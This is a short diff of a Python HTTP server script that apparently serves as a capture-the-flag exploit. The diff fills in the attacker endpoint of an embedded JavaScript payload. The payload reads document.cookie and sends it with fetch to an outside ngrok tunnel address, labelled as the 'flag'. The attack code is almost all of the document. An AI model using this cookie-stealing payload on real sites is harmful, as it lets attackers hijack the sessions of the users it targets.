@@ -7,7 +7,7 @@ class Server(BaseHTTPRequestHandler):
         print("URL:\n", self.path)
         js_code = '''
         var cookies = document.cookie;
-        fetch(`https://<IP>?flag=${encodeURIComponent(document.cookie)}`, {
+        fetch(`https://b9d9-109-132-185-150.ngrok-free.app?flag=${encodeURIComponent(document.cookie)}`, {
             method: 'GET',
         })
         '''
